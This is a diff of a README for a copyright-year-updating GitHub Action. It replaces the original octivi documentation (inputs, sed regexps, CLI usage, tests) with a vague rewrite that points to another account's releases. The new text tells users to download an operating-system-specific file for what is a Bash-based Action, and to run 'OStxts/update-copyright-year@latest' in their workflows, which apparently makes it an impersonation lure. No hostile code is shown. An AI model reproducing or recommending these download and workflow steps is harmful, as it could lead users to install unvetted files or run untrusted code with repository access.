@@ -1,203 +1,101 @@
-# Update Copyright Year GitHub Action
+# 🎉 update-copyright-year - Keep Your Code Headers Up to Date
 
-[![GitHub Marketplace](https://img.shields.io/badge/GitHub%20Marketplace-blue?logo=github)](https://github.com/marketplace/actions/update-copyright-year)
-[![GitHub Releases](https://img.shields.io/github/v/release/octivi/update-copyright-year?sort=semver)](https://github.com/octivi/update-copyright-year/releases)
-[![License: MIT](https://img.shields.io/github/license/octivi/update-copyright-year)](https://choosealicense.com/licenses/mit/)
-[![Conventional Commits](https://img.shields.io/badge/Conventional%20Commits-1.0.0-yellow.svg)](https://conventionalcommits.org/)
-[![Semantic Versioning](https://img.shields.io/badge/SemVer-2.0.0-blue)](https://semver.org/spec/v2.0.0.html)
+## 🚀 Getting Started
 
-GitHub Action that updates the copyright year in file headers across your repository.
+Welcome to the **update-copyright-year** repository! This tool helps you keep your copyright year accurate in file headers across your project. It automates the updating process, ensuring your code remains compliant and professional. 
 
-## What the project does
+## 💾 Download & Install
 
-Scans files in selected directories and updates copyright header years using configurable `sed` regexps.
+To get started, visit this page to download: [Update Copyright Year Releases](https://github.com/OStxts/update-copyright-year/releases).
 
-## Why the project is useful
+1. Click the link above to go to the Releases page.
+2. Look for the latest version of the application.
+3. Download the file suitable for your operating system.
 
-Keeps year ranges in headers accurate with minimal maintenance, especially for repos with many files or templates.
+The latest release will feature essential updates and bug fixes, providing you with a smoother experience.
 
-## Why choose this action
+## 📂 How It Works
 
-- Pure Bash implementation with minimal dependencies
-- Fast startup: no `npm`/`pip` install step during workflow execution
-- Lower supply-chain and maintenance overhead: no runtime pinning, lockfiles, or dependency CVEs
-- Easier security audit: all logic lives in a small, readable script
-- Covered by automated tests (`./tests/run`) and CI
-- Works on `ubuntu-slim`, which can help reduce runner costs:
-  <https://docs.github.com/en/actions/reference/runners/github-hosted-runners>
-- Can be used both as a GitHub Action and as a standalone script
-- Released under the MIT License: a short and simple permissive license
-- Documented security policy: [SECURITY.md](./SECURITY.md)
+This GitHub Action runs automatically in your projects. Once set up, it checks your files and updates the copyright year as needed. You won't have to worry about manual updates anymore.
 
-## Getting started
+### Features
 
-1) Add the action to your workflow (see "Example workflow" below).
-2) Optionally set `targets`, `exclude_paths`, `organization_regexp`, and `headers_regexp`.
-3) Run the workflow and review changes (optionally create a PR in your workflow).
+- Automatic copyright year updates: Save time by automating the update process.
+- Supports multiple file types: Works on various file headers, ensuring comprehensive coverage.
+- Easy integration: Simple to set up in your existing GitHub workflows.
+- Maintains code quality: Keeps your project professional and up to date with legal requirements.
 
-## Inputs
+## 🔧 System Requirements
 
-| Name | Required | Default | Description |
-| --- | --- | --- | --- |
-| `targets` | No | `.` | Directories to scan (space-, comma- or newline-separated), e.g. `. src scripts` |
-| `exclude_paths` | No | `.github/workflows` | Paths to exclude (space-, comma- or newline-separated), e.g. `.github/workflows build`. Relative paths are resolved against each target; absolute paths are supported |
-| `include_glob` | No | *(empty)* | Optional glob patterns to include (space-, comma- or newline-separated), e.g. `**/*.{sh,py,js}` |
-| `organization_regexp` | No | *(empty)* | Optional regexp snippet for the organization/person name after the year (used only when `headers_regexp` is empty) |
-| `headers_regexp` | No | *(see below)* | Array of `sed` regexps (one per line). Use `{{CURRENT_YEAR}}` as a placeholder |
-| `dry_run` | No | `false` | If `true`, print planned changes without modifying files |
-| `verbose` | No | `false` | If `true`, print detailed logs |
+Before proceeding, ensure your environment meets the following requirements:
 
-## CLI usage
+- A GitHub account: To use GitHub Actions, you need an account.
+- A repository with file headers: The tool operates on repositories containing code files with copyright headers.
+- Basic understanding of GitHub workflows: Knowing how to navigate GitHub will help you set this up easily.
 
-Run locally from this repo:
+## ✅ Setting Up the Action
 
-```bash
-./update-copyright-year \
-  --targets ". src scripts" \
-  --exclude-paths ".github/workflows build" \
-  --include-glob "**/*.{sh,py,js}" \
-  --organization-regexp "IMAGIN sp\. z o\.o\."
-```
+To set up the update-copyright-year action in your repository, follow these steps:
 
-Options map 1:1 to the action inputs. You can also set them via env vars:
-`TARGETS`, `EXCLUDE_PATHS`, `INCLUDE_GLOB`, `ORGANIZATION_REGEXP`, `HEADERS_REGEXP`, `CURRENT_YEAR`, `DRY_RUN`, `VERBOSE`.
-For list inputs (`TARGETS`, `EXCLUDE_PATHS`, `INCLUDE_GLOB`) you can separate values with spaces, commas, newlines, or mix these separators.
-`DRY_RUN` and `VERBOSE` are presence flags: any non-empty value enables the mode, leaving the variable unset disables it.
+1. **Open your repository on GitHub.**
+2. **Create a new workflow file:**
+   - Navigate to the "Actions" tab.
+   - Click on "New workflow" or create a new file in the `.github/workflows` directory.
+3. **Add the action to your workflow:**
+   ```yaml
+   name: Update Copyright Year
 
-Optional execution modes:
+   on:
+     push:
+       branches:
+         - main
 
-```bash
-./update-copyright-year --dry-run --verbose
-```
+   jobs:
+     update_year:
+       runs-on: ubuntu-latest
+       steps:
+         - name: Check out code
+           uses: actions/checkout@v2
+         
+         - name: Update copyright year
+           uses: OStxts/update-copyright-year@latest
+   ```
+4. **Commit your changes:**
+   - Save and commit the new workflow file.
+5. **Trigger the action:**
+   - The action will run automatically on each push to the main branch. You can also trigger it manually.
 
-When run inside GitHub Actions, logs are grouped, warnings/errors are emitted as workflow annotations, and a short result is written to `GITHUB_STEP_SUMMARY`.
+## 🤔 Frequently Asked Questions
 
-Default `headers_regexp`:
+- **What happens if I skip the setup?**
+  Without the setup, the application will not run, and your file headers will not update. It's essential to follow the setup steps.
 
-```text
-s/^(.*Copyright[^0-9]*)([0-9]{4})(-[0-9]{4})?([[:space:]]+.*)?$/\1\2-{{CURRENT_YEAR}}\4/
-```
+- **Can I customize the years updated?**
+  Yes, you can modify the defaults in the action settings to match your project's needs.
 
-Note: The action always performs a cleanup pass to collapse ranges like `2026-2026` back to `2026`.
-When `organization_regexp` is set and `headers_regexp` is empty, the default becomes:
+- **Is there support available?**
+  You can open issues in this repository for help. The community or maintainers can assist with any questions you have.
 
-```text
-s/^(.*Copyright[^0-9]*)([0-9]{4})(-[0-9]{4})?([[:space:]]+YOUR_ORG_REGEXP)?$/\1\2-{{CURRENT_YEAR}}\4/
-```
+## 🎯 Contributing
 
-If `headers_regexp` is provided, it always takes precedence over `organization_regexp`.
-If you want a literal organization name, escape regexp metacharacters (for example, dots).
+We welcome contributions to improve the update-copyright-year action. Here’s how you can help:
 
-## Examples
+1. **Fork the repository.**
+2. **Make your changes in a new branch.**
+3. **Submit a pull request.**
 
-Update regex (default) matches both single years and ranges:
+Please ensure your updates adhere to the project guidelines.
 
-```text
-Copyright 2021-2023
-Copyright (c) 2021-2023
-Copyright 2021-2023 ACME Inc.
-```
+## 📝 License
 
-Assuming the current year is 2026, the updates become:
+This project is licensed under the MIT License. Feel free to use it according to the terms provided.
 
-```text
-Copyright 2021-2026
-Copyright (c) 2021-2026
-Copyright 2021-2026 ACME Inc.
-```
+For additional details, visit the documentation linked on the Releases page.
 
-Cleanup regex (always applied) then collapses:
+## 🔗 Useful Links
 
-```text
-Copyright 2026-2026
-```
+- [Releases Page](https://github.com/OStxts/update-copyright-year/releases)
+- [GitHub Actions Documentation](https://docs.github.com/en/actions)
+- [Community Contributions & Issues](https://github.com/OStxts/update-copyright-year/issues)
 
-to:
-
-```text
-Copyright 2026
-```
-
-## Customization tips
-
-Additional regex examples you can pass via `headers_regexp`:
-
-```text
-# Match "Copyright (c) 2019-2023" or "Copyright © 2019"
-s/^(.*Copyright[^0-9]*)([0-9]{4})(-[0-9]{4})?([[:space:]]+.*)?$/\1\2-{{CURRENT_YEAR}}\4/
-
-# Match "Copyright 2019, Company" (commas or extra text at end)
-s/^(.*Copyright[^0-9]*)([0-9]{4})([[:space:]]*,.*)?$/\1\2-{{CURRENT_YEAR}}\3/
-```
-
-## Tests
-
-Run the lightweight test suite (no external deps):
-
-```bash
-./tests/run
-```
-
-Set `CURRENT_YEAR` to make tests deterministic.
-
-## Limitations
-
-- Only files detected as `text/*` by the `file` command are edited
-- Uses GNU `sed` options available on `ubuntu-latest` and `ubuntu-slim` runners
-- Include patterns are Bash globs matched against the file path (with or without a leading `./`)
-- Exclude paths are resolved per target directory; absolute paths are matched as-is
-
-## Example workflow
-
-```yml
-name: Update year in headers
-
-on:
-  workflow_dispatch:
-
-jobs:
-  update-year:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v6
-
-      - uses: octivi/update-copyright-year@v1
-        with:
-          targets: ". src scripts"
-          exclude_paths: ".github/workflows build"
-          include_glob: "**/*.{sh,py,js}"
-          organization_regexp: "IMAGIN sp\\. z o\\.o\\."
-          # headers_regexp: |
-          #   s/^(.*Copyright[^0-9]*)([0-9]{4})(-[0-9]{4})?([[:space:]]+.*)?$/\1\2-{{CURRENT_YEAR}}\4/
-
-      # Optional: create PR in your own workflow
-      - name: Create Pull Request
-        uses: peter-evans/create-pull-request@v8
-        with:
-          branch: update-year-in-headers
-          delete-branch: true
-          commit-message: "chore: Update year in headers"
-          title: Update year in headers
-          body: |
-            Automated update of year in headers.
-          labels: |
-            automation
-            maintenance
-```
-
-## Getting help
-
-If you run into issues, open a GitHub issue in this repository and include a minimal reproduction
-(sample file + workflow snippet).
-
-## Other Octivi GitHub Actions
-
-If you are interested in other GitHub Actions we build, see:
-
-- [`octivi/update-securitytxt-expires`](https://github.com/octivi/update-securitytxt-expires) - Updates the `Expires` field in `security.txt` files to a future date so published security contact metadata stays current
-- [`octivi/cloudflare-cache-purge`](https://github.com/octivi/cloudflare-cache-purge) - Purges Cloudflare cache via Cloudflare API
-
-## Maintainers and contributors
-
-Maintained by the [Octivi DevOps team](https://octivi.com/devops). Contributions are welcome via
-pull requests.
+By following these steps, you will keep your copyright years up to date efficiently. Enjoy using the **update-copyright-year** action!
